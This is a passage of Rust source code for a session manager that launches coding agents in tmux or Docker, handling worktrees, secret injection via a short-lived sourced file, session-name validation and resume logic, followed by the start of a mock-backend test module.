use std::collections::HashMap;
use std::sync::Arc;

#[cfg(not(coverage))]
use anyhow::Context;
use anyhow::{Result, anyhow, bail};
use chrono::Utc;
use pulpo_common::api::CreateSessionRequest;
use pulpo_common::event::{PulpoEvent, SessionEvent};
use pulpo_common::session::{Runtime, Session, SessionStatus, meta};
use std::sync::RwLock;
use tokio::sync::broadcast;
use uuid::Uuid;

use crate::backend::Backend;
use crate::config::InkConfig;
use crate::store::Store;

#[derive(Clone)]
pub struct SessionManager {
    backend: Arc<dyn Backend>,
    docker_backend: Option<Arc<dyn Backend>>,
    store: Store,
    inks: Arc<RwLock<HashMap<String, InkConfig>>>,
    default_command: Option<String>,
    event_tx: Option<broadcast::Sender<PulpoEvent>>,
    node_name: String,
    /// Grace period (seconds) after session creation before staleness checks apply.
    /// Prevents race where `is_alive()` returns false before tmux is fully ready.
    stale_grace_secs: i64,
}

/// Result of resolving an ink: command, description, and optional defaults for
/// secrets and runtime that the ink provides.
struct ResolvedInk {
    command: String,
    description: Option<String>,
    /// Secret names from the ink (merged with request secrets).
    secrets: Vec<String>,
    /// Runtime from the ink (used only if request doesn't specify one).
    runtime: Option<Runtime>,
}

impl SessionManager {
    pub fn new(
        backend: Arc<dyn Backend>,
        store: Store,
        inks: HashMap<String, InkConfig>,
        default_command: Option<String>,
    ) -> Self {
        Self {
            backend,
            docker_backend: None,
            store,
            inks: Arc::new(RwLock::new(inks)),
            default_command,
            event_tx: None,
            node_name: String::new(),
            stale_grace_secs: 5,
        }
    }

    #[must_use]
    pub fn with_docker_backend(mut self, backend: Arc<dyn Backend>) -> Self {
        self.docker_backend = Some(backend);
        self
    }

    /// Get the right backend for a session based on its `backend_session_id`.
    fn backend_for_id(&self, backend_id: &str) -> &Arc<dyn Backend> {
        if crate::backend::docker::is_docker_session(backend_id) {
            self.docker_backend.as_ref().unwrap_or(&self.backend)
        } else {
            &self.backend
        }
    }

    #[cfg(test)]
    #[must_use]
    pub const fn with_no_stale_grace(mut self) -> Self {
        self.stale_grace_secs = 0;
        self
    }

    #[must_use]
    pub fn with_event_tx(mut self, tx: broadcast::Sender<PulpoEvent>, node_name: String) -> Self {
        self.event_tx = Some(tx);
        self.node_name = node_name;
        self
    }

    /// Return a snapshot of the current inks map.
    pub fn inks(&self) -> HashMap<String, InkConfig> {
        self.inks.read().expect("inks lock poisoned").clone()
    }

    /// Replace the inks map (e.g., after config CRUD).
    pub fn set_inks(&self, inks: HashMap<String, InkConfig>) {
        *self.inks.write().expect("inks lock poisoned") = inks;
    }

    pub fn backend(&self) -> Arc<dyn Backend> {
        self.backend.clone()
    }

    fn emit_event(&self, session: &Session, previous_status: Option<SessionStatus>) {
        if let Some(tx) = &self.event_tx {
            let pr_url = session.meta_str(meta::PR_URL).map(str::to_owned);
            let error_status = session.meta_str(meta::ERROR_STATUS).map(str::to_owned);
            let event = SessionEvent {
                session_id: session.id.to_string(),
                session_name: session.name.clone(),
                status: session.status.to_string(),
                previous_status: previous_status.map(|s| s.to_string()),
                node_name: self.node_name.clone(),
                output_snippet: session.output_snapshot.clone(),
                timestamp: Utc::now().to_rfc3339(),
                git_branch: session.git_branch.clone(),
                git_commit: session.git_commit.clone(),
                git_insertions: session.git_insertions,
                git_deletions: session.git_deletions,
                git_files_changed: session.git_files_changed,
                pr_url,
                error_status,
                total_input_tokens: session.meta_parsed(meta::TOTAL_INPUT_TOKENS),
                total_output_tokens: session.meta_parsed(meta::TOTAL_OUTPUT_TOKENS),
                session_cost_usd: session.meta_parsed(meta::SESSION_COST_USD),
            };
            // Ignore send errors — no subscribers is OK
            let _ = tx.send(PulpoEvent::Session(event));
        }
    }

    /// Resolve the backend session ID for a session.
    /// Uses the stored `backend_session_id` if available, otherwise computes it
    /// from the session name (for legacy sessions created before this field existed).
    pub fn resolve_backend_id(&self, session: &Session) -> String {
        session
            .backend_session_id
            .clone()
            .unwrap_or_else(|| self.backend.session_id(&session.name))
    }

    #[allow(clippy::too_many_lines)]
    pub async fn create_session(&self, req: CreateSessionRequest) -> Result<Session> {
        // Validate session name: must be kebab-case (lowercase alphanumeric + hyphens).
        // This prevents shell injection via wrap_command where the name is interpolated
        // into a shell string, and matches the documented naming convention.
        validate_session_name(&req.name)?;

        // Resolve ink → get command, description, and ink defaults for secrets/runtime
        let resolved = self.resolve_ink(&req)?;
        let command = resolved.command;
        let description = resolved.description;

        // Default workdir to home dir
        let workdir = req.workdir.unwrap_or_else(|| {
            dirs::home_dir().map_or_else(|| "/tmp".to_owned(), |h| h.to_string_lossy().into_owned())
        });

        // Runtime: request overrides ink, ink overrides default (tmux)
        let runtime = req.runtime.or(resolved.runtime).unwrap_or_default();
        let wants_worktree = req.worktree.unwrap_or(false);
        // Validate workdir exists on the host.
        // Skip for Docker unless --worktree is requested (worktree creation happens on the host).
        if runtime != Runtime::Docker || wants_worktree {
            validate_workdir(&workdir)?;
        }

        // Create git worktree if requested
        let (effective_workdir, worktree_path, worktree_branch) = if wants_worktree {
            #[cfg(not(coverage))]
            {
                let wt_path = create_worktree(&workdir, &req.name, req.worktree_base.as_deref())?;
                (wt_path.clone(), Some(wt_path), Some(req.name.clone()))
            }
            #[cfg(coverage)]
            {
                (workdir.clone(), None, None)
            }
        } else {
            (workdir.clone(), None, None)
        };

        // Reject duplicate names among live sessions
        if self.store.has_active_session_by_name(&req.name).await? {
            bail!(
                "a session named '{}' is already active — stop it first or use a different name",
                req.name
            );
        }

        // Resolve secrets for injection: merge ink secrets with request secrets
        // Request secrets override ink secrets (request is more specific)
        let mut all_secret_names = resolved.secrets;
        if let Some(ref req_secrets) = req.secrets {
            for s in req_secrets {
                if !all_secret_names.contains(s) {
                    all_secret_names.push(s.clone());
                }
            }
        }
        let secrets_env = if all_secret_names.is_empty() {
            HashMap::new()
        } else {
            self.store
                .get_secrets_for_injection(&all_secret_names)
                .await?
        };

        let id = Uuid::new_v4();
        let name = req.name.clone();
        let backend_id = if runtime == Runtime::Docker {
            if self.docker_backend.is_none() {
                bail!("docker runtime not configured — set [docker] image in config.toml");
            }
            format!("docker:pulpo-{}", req.name)
        } else {
            self.backend.session_id(&name)
        };

        // Write secrets to a temp file (tmux only — Docker passes env vars separately).
        // The file is sourced and immediately deleted by the session shell, so secrets
        // never appear in the command string visible in `ps` or `capture-pane`.
        let secrets_file = if runtime != Runtime::Docker && !secrets_env.is_empty() {
            write_secrets_file(&id, &secrets_env, self.store.data_dir())?
        } else {
            None
        };

        // Docker sessions run the command directly; tmux sessions get the wrapper
        let final_command = if runtime == Runtime::Docker {
            command.clone()
        } else {
            wrap_command(&command, &id, &name, secrets_file.as_deref())
        };

        let now = Utc::now();
        let session = Session {
            id,
            name: name.clone(),
            workdir: workdir.clone(),
            command,
            description,
            status: SessionStatus::Creating,
            exit_code: None,
            backend_session_id: Some(backend_id.clone()),
            output_snapshot: None,
            metadata: req.metadata,
            ink: req.ink,
            intervention_code: None,
            intervention_reason: None,
            intervention_at: None,
            last_output_at: None,
            idle_since: None,
            idle_threshold_secs: req.idle_threshold_secs,
            worktree_path,
            worktree_branch,
            git_branch: None,
            git_commit: None,
            git_files_changed: None,
            git_insertions: None,
            git_deletions: None,
            git_ahead: None,
            runtime,
            created_at: now,
            updated_at: now,
        };

        self.store.insert_session(&session).await?;

        let active_backend = self.backend_for_id(&backend_id);
        if let Err(e) =
            active_backend.create_session(&backend_id, &effective_workdir, &final_command)
        {
            // Clean up the secrets file if it was created
            if let Some(ref sf) = secrets_file {
                let _ = std::fs::remove_file(sf);
            }
            self.store
                .update_session_status(&id.to_string(), SessionStatus::Stopped)
                .await?;
            return Err(e);
        }

        // Query the tmux $N session ID and update if available (tmux only)
        let mut session = session;
        if runtime == Runtime::Tmux
            && let Ok(tmux_id) = self.backend.query_backend_id(&name)
        {
            let _ = self
                .store
                .update_backend_session_id(&id.to_string(), &tmux_id)
                .await;
            session.backend_session_id = Some(tmux_id);
        }

        self.store
            .update_session_status(&id.to_string(), SessionStatus::Active)
            .await?;

        // Set up output logging
        let log_dir = format!("{}/logs", self.store.data_dir());
        let _ = std::fs::create_dir_all(&log_dir);
        let log_path = format!("{log_dir}/{id}.log");
        let _ = active_backend.setup_logging(&backend_id, &log_path);

        // Detect auth info from agent credentials and store in metadata
        #[cfg(not(coverage))]
        if let Some(auth_info) = crate::auth_info::detect_auth_for_command(&session.command) {
            let sid = id.to_string();
            let mut updates = vec![(meta::AUTH_PROVIDER, auth_info.provider.as_str())];
            if let Some(ref plan) = auth_info.plan {
                updates.push((meta::AUTH_PLAN, plan.as_str()));
            }
            if let Some(ref email) = auth_info.email {
                updates.push((meta::AUTH_EMAIL, email.as_str()));
            }
            let _ = self
                .store
                .batch_update_session_metadata(&sid, &updates, &[])
                .await;
            // Refresh session metadata to reflect the stored auth info
            if let Ok(Some(refreshed)) = self.store.get_session(&sid).await {
                session.metadata = refreshed.metadata;
            }
        }

        // Return the session with updated status (avoids unnecessary re-fetch)
        session.status = SessionStatus::Active;
        session.updated_at = Utc::now();
        self.emit_event(&session, Some(SessionStatus::Creating));
        Ok(session)
    }

    /// Resolve ink: if ink has command, use it. Request command takes precedence.
    /// Also resolves secrets and runtime defaults from the ink.
    fn resolve_ink(&self, req: &CreateSessionRequest) -> Result<ResolvedInk> {
        let mut ink_secrets: Vec<String> = Vec::new();
        let mut ink_runtime: Option<Runtime> = None;

        // If an ink is specified, extract its defaults
        if let Some(ref ink_name) = req.ink {
            let ink = self
                .inks
                .read()
                .expect("inks lock poisoned")
                .get(ink_name)
                .cloned()
                .ok_or_else(|| anyhow!("unknown ink: {ink_name}"))?;
            ink_secrets.clone_from(&ink.secrets);
            ink_runtime = ink.runtime.as_deref().and_then(|r| r.parse().ok());

            // If no explicit command, try the ink's command
            if req.command.is_none() {
                let command = ink.command.clone().unwrap_or_default();
                let description = req.description.clone().or(ink.description);
                if !command.is_empty() {
                    return Ok(ResolvedInk {
                        command,
                        description,
                        secrets: ink_secrets,
                        runtime: ink_runtime,
                    });
                }
                // Ink has no command — fall through to default_command / $SHELL
            }
        }

        // Explicit command takes precedence
        if let Some(ref cmd) = req.command {
            return Ok(ResolvedInk {
                command: cmd.clone(),
                description: req.description.clone(),
                secrets: ink_secrets,
                runtime: ink_runtime,
            });
        }

        // No command and no ink command — fall back to default_command from config
        if let Some(ref default_cmd) = self.default_command {
            return Ok(ResolvedInk {
                command: default_cmd.clone(),
                description: req.description.clone(),
                secrets: ink_secrets,
                runtime: ink_runtime,
            });
        }

        // No fallback available — fall back to $SHELL (or /bin/sh)
        let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_owned());
        Ok(ResolvedInk {
            command: shell,
            description: req.description.clone(),
            secrets: ink_secrets,
            runtime: ink_runtime,
        })
    }

    pub async fn get_session(&self, id: &str) -> Result<Option<Session>> {
        let session = self.store.get_session(id).await?;
        match session {
            Some(mut s) => {
                if self.check_and_mark_stale(&mut s).await? {
                    self.emit_event(&s, Some(SessionStatus::Active));
                }
                Ok(Some(s))
            }
            None => Ok(None),
        }
    }

    pub async fn list_sessions(&self) -> Result<Vec<Session>> {
        let mut sessions = self.store.list_sessions().await?;
        for session in &mut sessions {
            let _ = self.check_and_mark_stale(session).await;
        }
        Ok(sessions)
    }

    pub async fn list_sessions_filtered(
        &self,
        query: &pulpo_common::api::ListSessionsQuery,
    ) -> Result<Vec<Session>> {
        let mut sessions = self.store.list_sessions_filtered(query).await?;
        for session in &mut sessions {
            let _ = self.check_and_mark_stale(session).await;
        }
        Ok(sessions)
    }

    /// Check if a running session is still alive; if not, mark it stale.
    /// Returns `Ok(true)` if the session was transitioned to stale.
    ///
    /// Checks both `Active` and `Idle` sessions — after a reboot, tmux
    /// sessions are gone but DB status may still say Idle.
    async fn check_and_mark_stale(&self, session: &mut Session) -> Result<bool> {
        if session.status != SessionStatus::Active && session.status != SessionStatus::Idle {
            return Ok(false);
        }
        // Grace period: skip staleness check for recently created sessions to avoid a
        // race where `is_alive()` returns false before tmux is fully ready.
        let age = Utc::now() - session.created_at;
        if age.num_seconds() < self.stale_grace_secs {
            return Ok(false);
        }
        let backend_id = self.resolve_backend_id(session);
        let alive = self.backend_for_id(&backend_id).is_alive(&backend_id)?;
        if alive {
            return Ok(false);
        }
        self.store
            .update_session_status(&session.id.to_string(), SessionStatus::Lost)
            .await?;
        session.status = SessionStatus::Lost;
        Ok(true)
    }

    pub async fn stop_session(&self, id: &str, purge: bool) -> Result<()> {
        let session = self
            .store
            .get_session(id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {id}"))?;

        let backend_id = self.resolve_backend_id(&session);
        let backend = self.backend_for_id(&backend_id);
        if let Err(e) = backend.kill_session(&backend_id) {
            // The stored $N backend ID may be stale — retry with the session name.
            let name_id = self.backend.session_id(&session.name);
            if name_id != backend_id && backend.kill_session(&name_id).is_ok() {
                tracing::info!(session = %session.name, "Killed session by name after stale backend ID failed");
            } else if session.status == SessionStatus::Lost
                || session.status == SessionStatus::Stopped
                || session.status == SessionStatus::Ready
            {
                // For terminal states the backend process is already gone — that's fine.
                tracing::debug!(session = %session.name, error = %e, "Ignoring kill error for {status} session", status = session.status);
            } else {
                bail!("failed to stop session: {e}");
            }
        }

        let previous = session.status;
        let session_id = session.id.to_string();
        self.store
            .update_session_status(&session_id, SessionStatus::Stopped)
            .await?;
        let mut stopped_session = session;
        stopped_session.status = SessionStatus::Stopped;
        self.emit_event(&stopped_session, Some(previous));

        if purge {
            // Clean up worktree only on purge — stop preserves it for resume.
            if let Some(ref wt_path) = stopped_session.worktree_path {
                tracing::info!(session = %stopped_session.name, path = %wt_path, "Cleaning up worktree after purge");
                cleanup_worktree(wt_path, &stopped_session.workdir);
            }
            self.store.delete_session(&session_id).await?;
        }

        Ok(())
    }

    pub fn capture_output(&self, id: &str, backend_id: &str, lines: usize) -> String {
        self.backend
            .capture_output(backend_id, lines)
            .unwrap_or_else(|_| self.read_log_tail(id, lines))
    }

    fn read_log_tail(&self, id: &str, lines: usize) -> String {
        let log_path = format!("{}/logs/{id}.log", self.store.data_dir());
        let content = std::fs::read_to_string(&log_path).unwrap_or_default();
        let mut tail: Vec<&str> = content.lines().rev().take(lines).collect();
        tail.reverse();
        tail.join("\n")
    }

    pub fn send_input(&self, backend_id: &str, text: &str) -> Result<()> {
        self.backend.send_input(backend_id, text)
    }

    pub async fn resume_session(&self, id: &str) -> Result<Session> {
        let session = self
            .store
            .get_session(id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {id}"))?;

        let previous_status = session.status;
        if previous_status != SessionStatus::Lost && previous_status != SessionStatus::Ready {
            bail!("session cannot be resumed (status: {previous_status})");
        }

        // Check for name collision with another live session (exclude self)
        if self
            .store
            .has_active_session_by_name_excluding(&session.name, Some(&session.id.to_string()))
            .await?
        {
            bail!(
                "another session named '{}' is already active — stop it first before resuming",
                session.name
            );
        }

        // Use worktree path as workdir if it still exists, otherwise fall back to original workdir.
        let effective_workdir = session
            .worktree_path
            .as_ref()
            .filter(|p| std::path::Path::new(p).exists())
            .cloned()
            .unwrap_or_else(|| session.workdir.clone());

        // Validate workdir still exists (skip for Docker — workdir is inside the container)
        if session.runtime != Runtime::Docker {
            validate_workdir(&effective_workdir)?;
        }

        // If the backend session is still alive, just re-mark it as running.
        // Only recreate the session if the backend process is gone.
        let backend_id = self.resolve_backend_id(&session);
        let active_backend = self.backend_for_id(&backend_id);
        let alive = active_backend.is_alive(&backend_id)?;
        if !alive {
            // Use session name for the new tmux session, not the stale $N backend ID.
            // The old backend_session_id may point to a dead tmux session that no longer exists.
            let create_id = if session.runtime == Runtime::Docker {
                backend_id.clone()
            } else {
                self.backend.session_id(&session.name)
            };
            let final_command = if session.runtime == Runtime::Docker {
                session.command.clone()
            } else {
                wrap_command(&session.command, &session.id, &session.name, None)
            };
            active_backend.create_session(&create_id, &effective_workdir, &final_command)?;

            // Query the new tmux $N session ID and update the stored backend_session_id
            if session.runtime == Runtime::Tmux
                && let Ok(tmux_id) = self.backend.query_backend_id(&session.name)
            {
                let _ = self
                    .store
                    .update_backend_session_id(&session.id.to_string(), &tmux_id)
                    .await;
            }
        }

        let session_id = session.id.to_string();
        self.store
            .update_session_status(&session_id, SessionStatus::Active)
            .await?;

        let mut session = session;
        session.status = SessionStatus::Active;
        session.updated_at = Utc::now();
        self.emit_event(&session, Some(previous_status));
        Ok(session)
    }

    /// Resume all sessions that were Active or Idle but have dead backends.
    /// Called on startup to recover sessions lost during a reboot.
    /// Returns the number of sessions successfully resumed.
    pub async fn resume_lost_sessions(&self) -> Result<usize> {
        let sessions = self.store.list_sessions().await?;
        let mut resumed = 0;
        for session in sessions {
            if session.status != SessionStatus::Active && session.status != SessionStatus::Idle {
                continue;
            }
            let backend_id = self.resolve_backend_id(&session);
            let active_backend = self.backend_for_id(&backend_id);
            let alive = active_backend.is_alive(&backend_id).unwrap_or(false);
            if alive {
                continue;
            }
            // Backend is dead — resume the session
            let final_command = if session.runtime == Runtime::Docker {
                session.command.clone()
            } else {
                wrap_command(&session.command, &session.id, &session.name, None)
            };
            if let Err(e) =
                active_backend.create_session(&backend_id, &session.workdir, &final_command)
            {
                tracing::warn!(
                    session = %session.name,
                    error = %e,
                    "Failed to auto-resume session on startup"
                );
                self.store
                    .update_session_status(&session.id.to_string(), SessionStatus::Lost)
                    .await?;
                continue;
            }

            // Query the new tmux $N session ID (tmux only)
            if session.runtime == Runtime::Tmux
                && let Ok(tmux_id) = self.backend.query_backend_id(&session.name)
            {
                let _ = self
                    .store
                    .update_backend_session_id(&session.id.to_string(), &tmux_id)
                    .await;
            }

            // Re-mark as Active
            self.store
                .update_session_status(&session.id.to_string(), SessionStatus::Active)
                .await?;
            tracing::info!(session = %session.name, "Auto-resumed session after restart");
            resumed += 1;
        }
        Ok(resumed)
    }

    pub const fn store(&self) -> &Store {
        &self.store
    }
}

/// Validate that a session name is safe for shell interpolation and tmux usage.
/// Allows lowercase alphanumeric characters and hyphens (kebab-case).
/// Must start and end with alphanumeric. Max 128 chars.
fn validate_session_name(name: &str) -> Result<()> {
    if name.is_empty() {
        bail!("session name must not be empty");
    }
    if name.len() > 128 {
        bail!("session name must be at most 128 characters");
    }
    if !name
        .bytes()
        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
    {
        bail!("session name must contain only lowercase letters, digits, and hyphens: {name}");
    }
    if name.starts_with('-') || name.ends_with('-') {
        bail!("session name must not start or end with a hyphen: {name}");
    }
    Ok(())
}

fn validate_workdir(workdir: &str) -> Result<()> {
    let path = std::path::Path::new(workdir);
    if !path.exists() {
        bail!("working directory does not exist: {workdir}");
    }
    if !path.is_dir() {
        bail!("working directory is not a directory: {workdir}");
    }
    Ok(())
}

/// Wrap a command for tmux: escape single quotes, wrap in $SHELL -l -c with agent exit marker.
/// Prepends `PULPO_SESSION_ID` and `PULPO_SESSION_NAME` env vars so tools inside
/// sessions can identify their pulpo context.
/// Known shell binaries — when the command is a bare shell, skip the agent exit wrapper.
const SHELL_COMMANDS: &[&str] = &["bash", "zsh", "sh", "fish", "nu"];

/// Check if a command is a bare shell (no agent work to wrap).
fn is_shell_command(command: &str) -> bool {
    let basename = command.rsplit('/').next().unwrap_or(command).trim();
    SHELL_COMMANDS.contains(&basename)
}

/// Wrap an agent command with env vars, exit marker, and fallback shell.
/// Shell commands are run directly (no exit marker or fallback bash).
///
/// Create a git worktree for a session.
/// Worktrees are created under `~/.pulpo/worktrees/<session-name>` to avoid
/// polluting the project repository with a `.pulpo/` directory.
/// Returns the worktree path on success.
#[cfg(not(coverage))]
fn create_worktree(
    repo_dir: &str,
    session_name: &str,
    worktree_base: Option<&str>,
) -> Result<String> {
    let home = dirs::home_dir().context("cannot determine home directory")?;
    let wt_base_dir = home.join(".pulpo").join("worktrees");
    let worktree_dir = wt_base_dir.join(session_name);
    let worktree_dir_str = worktree_dir
        .to_str()
        .context("worktree path contains invalid UTF-8")?
        .to_owned();
    let branch_name = session_name.to_owned();

    // Ensure parent directory exists
    std::fs::create_dir_all(&wt_base_dir)?;

    // Build args: `git worktree add -b <branch> <path> [<base-branch>]`
    let mut args = vec![
        "worktree".to_owned(),
        "add".to_owned(),
        "-b".to_owned(),
        branch_name.clone(),
        worktree_dir_str.clone(),
    ];
    if let Some(base) = worktree_base {
        args.push(base.to_owned());
    }
    let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();

    let output = std::process::Command::new("git")
        .args(&args_ref)
        .current_dir(repo_dir)
        .output()
        .context("failed to run git worktree add")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // If the branch already exists (stale from a previous unclean shutdown),
        // delete it and retry.
        if stderr.contains("already exists") {
            tracing::info!(branch = %branch_name, "Stale branch found, deleting and retrying");
            let _ = std::process::Command::new("git")
                .args(["branch", "-D", &branch_name])
                .current_dir(repo_dir)
                .output();
            let retry = std::process::Command::new("git")
                .args(&args_ref)
                .current_dir(repo_dir)
                .output()
                .context("failed to run git worktree add (retry)")?;
            if !retry.status.success() {
                let retry_stderr = String::from_utf8_lossy(&retry.stderr);
                bail!(
                    "git worktree add failed after branch cleanup: {}",
                    retry_stderr.trim()
                );
            }
        } else {
            bail!("git worktree add failed: {}", stderr.trim());
        }
    }

    Ok(worktree_dir_str)
}

/// Remove a git worktree, prune stale entries, and delete the associated branch.
///
/// `repo_dir` is the original repository directory where the worktree was
/// created from — needed to run `git worktree prune` in the correct repo.
pub(crate) fn cleanup_worktree(worktree_path: &str, repo_dir: &str) {
    if std::path::Path::new(worktree_path).exists() {
        match std::fs::remove_dir_all(worktree_path) {
            Ok(()) => tracing::info!(path = %worktree_path, "Worktree directory removed"),
            Err(e) => {
                tracing::warn!(path = %worktree_path, error = %e, "Failed to remove worktree directory");
            }
        }
    } else {
        tracing::info!(path = %worktree_path, "Worktree path does not exist, skipping cleanup");
    }

    // Always prune — the directory may have been manually removed but git
    // metadata could linger.
    let _ = std::process::Command::new("git")
        .args(["worktree", "prune"])
        .current_dir(repo_dir)
        .output();

    // Delete the branch created by `git worktree add -b <session-name>`.
    // The session name is the last component of the worktree path.
    if let Some(branch_name) = std::path::Path::new(worktree_path)
        .file_name()
        .and_then(|n| n.to_str())
    {
        match std::process::Command::new("git")
            .args(["branch", "-D", branch_name])
            .current_dir(repo_dir)
            .output()
        {
            Ok(output) if output.status.success() => {
                tracing::info!(branch = %branch_name, "Worktree branch deleted");
            }
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                tracing::debug!(
                    branch = %branch_name,
                    stderr = %stderr.trim(),
                    "Branch deletion skipped (may not exist)"
                );
            }
            Err(e) => {
                tracing::warn!(
                    branch = %branch_name,
                    error = %e,
                    "Failed to run git branch -D"
                );
            }
        }
    }
}

/// Write secrets to a file in `data_dir` that will be sourced and immediately deleted
/// by the session command. Returns `Some(path)` if secrets were written, `None` if
/// there are no secrets.
///
/// Security: the file is created with mode 0600 atomically via `OpenOptions` on Unix,
/// so there is no race window where it is world-readable. Secrets never appear in the
/// command string visible in `ps`, tmux `capture-pane`, or the database. The file is
/// deleted by the session shell immediately after sourcing.
fn write_secrets_file(
    session_id: &uuid::Uuid,
    secrets: &HashMap<String, String>,
    data_dir: &str,
) -> Result<Option<String>> {
    use std::fmt::Write;
    use std::io::Write as IoWrite;

    if secrets.is_empty() {
        return Ok(None);
    }

    let mut content = String::new();
    for (key, value) in secrets {
        let escaped_value = value.replace('\'', "'\\''");
        let _ = writeln!(content, "export {key}='{escaped_value}'");
    }

    let secrets_dir = format!("{data_dir}/secrets");
    std::fs::create_dir_all(&secrets_dir)
        .map_err(|e| anyhow!("failed to create secrets directory {secrets_dir}: {e}"))?;

    let path = format!("{secrets_dir}/secrets-{session_id}.sh");

    // Create the file with restrictive permissions (0600) atomically on Unix —
    // no race window where the file is world-readable.
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        let mut file = std::fs::OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .mode(0o600)
            .open(&path)
            .map_err(|e| anyhow!("failed to create secrets file {path}: {e}"))?;
        file.write_all(content.as_bytes())
            .map_err(|e| anyhow!("failed to write secrets file {path}: {e}"))?;
    }

    #[cfg(not(unix))]
    {
        std::fs::write(&path, &content)
            .map_err(|e| anyhow!("failed to write secrets file {path}: {e}"))?;
    }

    Ok(Some(path))
}

/// Wraps a command for execution in a tmux session, using the user's login shell
/// to ensure PATH includes tools installed via Homebrew, nvm, pyenv, etc.
///
/// Uses `$SHELL -l -c` (login shell) rather than hardcoded `bash -l -c` because
/// users often configure PATH in shell-specific files (`.zshrc`, `.zprofile`).
/// When pulpod runs as a launchd/systemd service, the environment is minimal,
/// so the login shell profile sourcing is critical for finding agent binaries.
///
/// Test-only public wrapper for `wrap_command`, used by tmux integration tests
/// to verify the full command survives shell parsing and tmux execution.
#[cfg(test)]
pub(crate) fn wrap_command_for_test(
    command: &str,
    session_id: &uuid::Uuid,
    session_name: &str,
    secrets_file: Option<&str>,
) -> String {
    wrap_command(command, session_id, session_name, secrets_file)
}

/// If `secrets_file` is provided, the command will source the file and delete it
/// immediately — secrets never appear in the command string itself.
fn wrap_command(
    command: &str,
    session_id: &uuid::Uuid,
    session_name: &str,
    secrets_file: Option<&str>,
) -> String {
    // Detect the user's preferred shell. Falls back to bash if $SHELL is unset.
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/bash".to_owned());

    // Build the secrets-sourcing prefix: source the file and delete it immediately.
    // Uses `. <file>` (POSIX source) for compatibility.
    let secrets_source =
        secrets_file.map_or_else(String::new, |path| format!(". {path} && rm -f {path}; "));

    // Defense-in-depth: escape session_name for shell safety even though
    // create_session validates it as kebab-case. This prevents injection if
    // wrap_command is ever called from a path that bypasses validation.
    let safe_name = session_name.replace('\'', "'\\''");

    // Common env: session identity + suppress browser launches from agents.
    // BROWSER=true: tools using Node `open` package, Python `webbrowser`, etc. become no-ops.
    // open() wrapper: intercepts only URL opens (http/https), passes file/dir opens to real
    // /usr/bin/open so image paste, file handling, etc. still work.
    let env = format!(
        "{secrets_source}export PULPO_SESSION_ID={session_id}; export PULPO_SESSION_NAME={safe_name}; export BROWSER=true; \
         open() {{ case \"$1\" in http://*|https://*) return 0;; *) command open \"$@\";; esac; }}; "
    );

    if is_shell_command(command) {
        // Shell session: set env vars and exec the shell directly.
        // No exit marker, no fallback bash — exiting the shell kills the tmux session.
        let escaped = command.replace('\'', "'\\''");
        return format!("{shell} -l -c '{env}exec {escaped}'");
    }
    let escaped = command.replace('\'', "'\\''");
    // After the agent exits, fall back to the user's shell so they can inspect the workdir.
    format!(
        "{shell} -l -c '{env}{escaped}; echo '\\''[pulpo] Agent exited (session: {safe_name}). Run: pulpo resume {safe_name}'\\''; exec {shell} -l'"
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use pulpo_common::event::SessionEvent;
    use std::sync::Mutex;

    /// Extract the inner `SessionEvent` from a `PulpoEvent`.
    fn unwrap_session_event(event: PulpoEvent) -> SessionEvent {
        match event {
            PulpoEvent::Session(se) => se,
        }
    }

    struct MockBackend {
        create_result: Mutex<Result<()>>,
        kill_result: Mutex<Result<()>>,
        alive: Mutex<bool>,
        captured_output: Mutex<String>,
        calls: Mutex<Vec<String>>,
    }

    impl MockBackend {
        fn new() -> Self {
            Self {
                create_result: Mutex::new(Ok(())),
                kill_result: Mutex::new(Ok(())),
                alive: Mutex::new(true),
                captured_output: Mutex::new("test output".into()),
                calls: Mutex::new(vec![]),
            }
        }

        fn with_create_error(self) -> Self {
            *self.create_result.lock().unwrap() = Err(anyhow!("backend not found"));
            self
        }

        fn with_kill_error(self) -> Self {
            *self.kill_result.lock().unwrap() = Err(anyhow!("kill failed"));
            self
        }

        fn with_alive(self, alive: bool) -> Self {
            *self.alive.lock().unwrap() = alive;
            self
        }
    }

    impl Backend for MockBackend {
        fn create_session(&self, name: &str, working_dir: &str, command: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("create:{name}:{working_dir}:{command}"));
            let mut result = self.create_result.lock().unwrap();
            std::mem::replace(&mut *result, Ok(()))
        }

        fn kill_session(&self, name: &str) -> Result<()> {
            self.calls.lock().unwrap().push(format!("kill:{name}"));
            let mut result = self.kill_result.lock().unwrap();
            std::mem::replace(&mut *result, Ok(()))
        }

        fn is_alive(&self, name: &str) -> Result<bool> {
            self.calls.lock().unwrap().push(format!("is_alive:{name}"));
            Ok(*self.alive.lock().unwrap())
        }

        fn capture_output(&self, name: &str, lines: usize) -> Result<String> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("capture:{name}:{lines}"));
            Ok(self.captured_output.lock().unwrap().clone())
        }

        fn send_input(&self, name: &str, text: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("send_input:{name}:{text}"));
            Ok(())
        }

        fn setup_logging(&self, name: &str, log_path: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("setup_logging:{name}:{log_path}"));
            Ok(())
        }

        fn query_backend_id(&self, name: &str) -> anyhow::Result<String> {
            Ok(format!("${}", name.len()))
        }

        fn list_sessions(&self) -> anyhow::Result<Vec<(String, String)>> {
            Ok(Vec::new())
        }
    }

    struct FailCapture;
    impl Backend for FailCapture {
        fn create_session(&self, _: &str, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
        fn kill_session(&self, _: &str) -> Result<()> {
            Ok(())
        }
        fn is_alive(&self, _: &str) -> Result<bool> {
            Ok(true)
        }
        fn capture_output(&self, _: &str, _: usize) -> Result<String> {
            Err(anyhow!("session not alive"))
        }
        fn send_input(&self, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
        fn setup_logging(&self, _: &str, _: &str) -> Result<()> {
            Ok(())
